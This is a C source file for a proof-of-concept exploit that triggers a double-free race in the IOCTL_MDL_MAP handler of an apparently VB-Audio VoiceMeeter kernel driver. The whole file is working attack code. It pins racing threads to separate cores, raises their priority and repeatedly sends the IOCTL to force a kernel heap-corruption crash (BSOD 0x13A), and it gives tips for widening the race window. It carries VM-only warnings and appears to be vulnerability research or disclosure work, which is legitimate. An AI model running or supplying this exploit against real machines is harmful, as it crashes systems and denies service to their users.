/*
 * 01_double_free.c — MDL double‑free race (CWE‑415 / CWE‑362)
 * =============================================================
 *
 * What this demonstrates:
 *   The driver's IOCTL_MDL_MAP handler frees a global MDL pointer
 *   (DAT_00017dc0) via IoFreeMdl(), then zeroes the pointer.
 *   Between these two operations, a second thread can read the
 *   stale non‑zero pointer and also call IoFreeMdl() on the same
 *   already‑freed MDL.  This double‑free corrupts the LFH free list
 *   and causes a KERNEL_MODE_HEAP_CORRUPTION bugcheck (0x13A).
 *
 * VM‑specific fixes in this version:
 *   1. Each thread opens its OWN device handle — avoids I/O manager
 *      serializing IRPs from the same handle.
 *   2. Auto‑detects CPU core count and warns if < 2.
 *   3. Sets REALTIME_PRIORITY_CLASS on the process.
 *   4. Pins each thread to a different physical core.
 *   5. Uses flag=1 (remap path) so the MDL is re‑created every
 *      iteration, giving infinite retry opportunities.
 *
 * How to build:
 *   gcc -O2 -DUNICODE -D_WIN32_WINNT=0x0600 -o 01_double_free.exe \
 *       01_double_free.c -lsetupapi -static -lwinmm
 *
 * [!]  WARNING — this WILL crash the system.
 *    Run ONLY in an isolated VM with a snapshot.
 *    The VM must have at least 2 vCPUs.
 */

#include "device.h"
#include <stdio.h>
#include <stdlib.h>
#include <process.h>
#include <mmsystem.h>


/* ---- shared state ---- */

static volatile int  keepRunning    = 1;
static volatile long iterationCount = 0;


/*
 * raceThread — worker that hammers IOCTL_MDL_MAP on its own handle.
 *
 * Opens a SEPARATE device handle to avoid I/O manager serializing
 * IRPs from the same handle.  Uses flag=1 (remap path) so the MDL
 * is freed and re‑created every call, keeping DAT_00017dc0 non‑zero.
 */
static unsigned __stdcall raceThread(void *argument) {
    DWORD coreIndex = (DWORD)(ULONG_PTR)argument;

    // Pin to a specific CPU core — without this, the VM scheduler
    // may put both threads on the same vCPU, making the race impossible
    DWORD_PTR coreMask = (DWORD_PTR)1 << coreIndex;
    SetThreadAffinityMask(GetCurrentThread(), coreMask);

    // Maximum thread priority
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

    // Open a SEPARATE handle for this thread
    // This prevents the I/O manager from serializing our IRPs
    HANDLE device = openDevice();

    if (device == INVALID_HANDLE_VALUE) {
        printf("[fail] thread %lu: cannot open device\n", coreIndex);
        return 1;
    }

    DWORD flag = 1;       // flag=1: free old MDL + allocate new MDL
    BYTE  output[32];
    DWORD bytesReturned;

    while (keepRunning) {
        InterlockedIncrement(&iterationCount);

        if (!sendIoctl(device, IOCTL_MDL_MAP,
                       &flag, sizeof(flag),
                       output, sizeof(output), &bytesReturned)) {
            break;  // driver crashed or device gone
        }
    }

    // Clean up this handle's MDL before closing
    flag = 0;
    sendIoctl(device, IOCTL_MDL_MAP,
              &flag, sizeof(flag),
              output, sizeof(output), &bytesReturned);

    CloseHandle(device);
    return 0;
}


int main(int argc, char *argv[]) {
    printf("============================================================\n");
    printf(" PoC 01: MDL Double‑Free Race -> DoS (BSOD 0x13A)\n");
    printf("============================================================\n\n");

    int runSeconds  = (argc > 1) ? atoi(argv[1]) : 120;
    int threadCount = (argc > 2) ? atoi(argv[2]) : 0;

    // Auto‑detect CPU core count
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    int coreCount = (int)sysInfo.dwNumberOfProcessors;

    // Default: use all cores (but at least 2)
    if (threadCount <= 0) {
        threadCount = coreCount;
    }
    if (threadCount < 2)  { threadCount = 2; }
    if (threadCount > 8)  { threadCount = 8; }
    if (threadCount > coreCount) {
        threadCount = coreCount;
    }

    printf("[warn] [!]  This WILL cause a BSOD (0x13A).\n");
    printf("[warn] [!]  Run ONLY in an isolated VM with a snapshot.\n");
    printf("[warn] [!]  Press Ctrl+C within 3 seconds to abort...\n\n");
    Sleep(3000);

    printf("[info] CPU cores:   %d\n", coreCount);
    printf("[info] race threads: %d (each on its own core)\n", threadCount);
    printf("[info] run duration: %d seconds\n\n", runSeconds);

    if (coreCount < 2) {
        printf("[WARN] [!]  Only 1 CPU core detected!\n");
        printf("[WARN]    The race requires TRUE parallelism (2+ cores).\n");
        printf("[WARN]    Add more vCPUs to the VM and retry.\n\n");
    }

    // Boost process priority to reduce interference
    SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);

    // Increase timer resolution to 1ms — creates more preemption points
    timeBeginPeriod(1);

    // ---- Step 1: create the initial MDL (gives the race a target) ----

    printf("[step] creating initial MDL...\n");

    HANDLE setupDevice = openDevice();

    if (setupDevice == INVALID_HANDLE_VALUE) {
        printf("[fail] cannot open device.\n");
        printf("[hint] is VB-Audio VoiceMeeter AUX VAIO installed?\n");
        timeEndPeriod(1);
        return 1;
    }

    DWORD bytesReturned;
    DWORD mapFlag = 1;
    BYTE  mapOutput[64];

    if (!sendIoctl(setupDevice, IOCTL_MDL_MAP,
                   &mapFlag, sizeof(mapFlag),
                   mapOutput, sizeof(mapOutput), &bytesReturned)) {
        printf("[fail] IOCTL_MDL_MAP failed: %lu\n", GetLastError());
        printf("[hint] the driver's buffer may be NULL.\n");
        CloseHandle(setupDevice);
        timeEndPeriod(1);
        return 2;
    }

    ULONGLONG mdlPointer = *(ULONGLONG *)(mapOutput + 16);

    if (mdlPointer == 0) {
        printf("[fail] no MDL created.\n");
        CloseHandle(setupDevice);
        timeEndPeriod(1);
        return 3;
    }

    printf("[ok]   MDL created (ptr=0x%016llX)\n\n", mdlPointer);

    // Keep setup handle open so DAT_00017f78 stays non‑NULL
    // (the race threads need DAT_00017f78 to be non‑NULL for flag=1)

    // ---- Step 2: start race threads ----

    printf("[step] starting %d race threads (each with own handle)...\n",
           threadCount);
    printf("[warn] system may crash within the next %d seconds.\n\n",
           runSeconds);

    HANDLE threadHandles[8];

    for (int i = 0; i < threadCount; i++) {
        threadHandles[i] = (HANDLE)_beginthreadex(
            NULL, 0, raceThread,
            (void *)(ULONG_PTR)i, 0, NULL);
    }

    // ---- Wait for crash or timeout ----

    Sleep((DWORD)(runSeconds * 1000));

    keepRunning = 0;

    WaitForMultipleObjects(threadCount, threadHandles, TRUE, 5000);

    for (int i = 0; i < threadCount; i++) {
        CloseHandle(threadHandles[i]);
    }

    printf("\n[info] timeout — %ld iterations, no crash.\n", iterationCount);
    printf("[info] the race window was not hit.\n\n");
    printf("[hint] try:\n");
    printf("  1. ensure VM has 2+ vCPUs\n");
    printf("  2. run longer: 01_double_free.exe 600 2\n");
    printf("  3. enable Driver Verifier:\n");
    printf("     verifier /standard /driver vbaudio_vmauxvaio64_win10.sys\n");
    printf("     then reboot and re‑run (verifier widens the race window)\n");

    // ---- Cleanup ----

    mapFlag = 0;
    sendIoctl(setupDevice, IOCTL_MDL_MAP,
              &mapFlag, sizeof(mapFlag),
              mapOutput, sizeof(mapOutput), &bytesReturned);

    CloseHandle(setupDevice);
    timeEndPeriod(1);

    return 0;
}

